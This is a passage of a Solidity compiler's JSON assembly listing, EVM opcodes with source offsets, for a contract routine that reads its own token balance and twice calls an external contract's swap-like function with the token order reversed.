											"end": 1106,
											"name": "tag",
											"source": 4,
											"value": "141"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "142"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "tag",
											"source": 4,
											"value": "142"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "144"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "tag",
											"source": 4,
											"value": "144"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1139,
											"end": 1145,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1180,
											"end": 1184,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1121,
											"end": 1124,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1116,
											"end": 1130,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1116,
											"end": 1130,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1139,
											"end": 1145,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1139,
											"end": 1145,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1131,
											"end": 1137,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1171,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1147,
											"end": 1171,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "147"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "tag",
											"source": 4,
											"value": "147"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "148"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1147,
											"end": 1186,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "tag",
											"source": 4,
											"value": "148"
										},
										{
											"begin": 1147,
											"end": 1186,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "149"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1116,
											"end": 1187,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "tag",
											"source": 4,
											"value": "149"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "150"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "tag",
											"source": 4,
											"value": "150"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "152"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "tag",
											"source": 4,
											"value": "152"
										},
										{
											"begin": 1116,
											"end": 1187,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1220,
											"end": 1226,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1261,
											"end": 1265,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1202,
											"end": 1205,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1197,
											"end": 1211,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1197,
											"end": 1211,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1220,
											"end": 1226,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1220,
											"end": 1226,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1212,
											"end": 1218,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1252,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1228,
											"end": 1252,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "155"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "tag",
											"source": 4,
											"value": "155"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "156"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1228,
											"end": 1267,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "tag",
											"source": 4,
											"value": "156"
										},
										{
											"begin": 1228,
											"end": 1267,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "157"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1197,
											"end": 1268,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "tag",
											"source": 4,
											"value": "157"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1197,
											"end": 1268,
